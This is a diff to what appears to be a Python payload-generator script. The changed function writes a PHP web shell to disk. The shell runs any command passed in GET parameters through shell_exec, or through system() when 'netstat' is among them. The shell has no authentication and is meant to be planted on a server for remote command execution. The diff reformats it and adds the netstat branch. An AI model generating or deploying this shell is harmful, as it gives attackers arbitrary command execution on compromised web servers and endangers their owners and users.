@@ -57,18 +57,21 @@ elif len(_sys) >= 3:
 	def File_Create(secnd_arge,extention=''):
 		with open(secnd_arge+extention,"w") as f:
 			f.write('''
-      	<?php
-           $ar = array();
-           if(isset($_GET) and ! empty($_GET)){
-                foreach ($_GET as $command){
-                     array_push($ar,$command);
-                }
-                echo (@(shell_exec(($ar[0])." ".$ar[1]." ".$ar[2]." ".$ar[3])." ".$ar[4]." ".$ar[5]." ".$ar[6]." ".$ar[7]." "));
-           }
-           else{
-                echo "<h3>"."Plz Enter [GET] Var"."<h3>";
-           }
-      	?>
+			<?php
+				$ar = array();
+				if(isset($_GET) and ! empty($_GET)){
+					foreach($_GET as $command){
+						array_push($ar,$command);
+					}
+					if(in_array("netstat",$ar)){
+						echo (@(system(($ar[0])." ".$ar[1]." ".$ar[2]." ".$ar[3])." ".$ar[4]." ".$ar[5]." ".$ar[6]." ".$ar[7]." "));
+					}else{
+						echo (@(shell_exec(($ar[0])." ".$ar[1]." ".$ar[2]." ".$ar[3])." ".$ar[4]." ".$ar[5]." ".$ar[6]." ".$ar[7]." "));
+					}
+				}else{
+					echo "<h3>"."Plz Enter [GET] Var"."<h3>";
+				}
+			?>
                    ''')
 	if "-p" in frist_arge or "-P" in frist_arge or "--payload" in frist_arge:
 		if ".php" in secnd_arge:
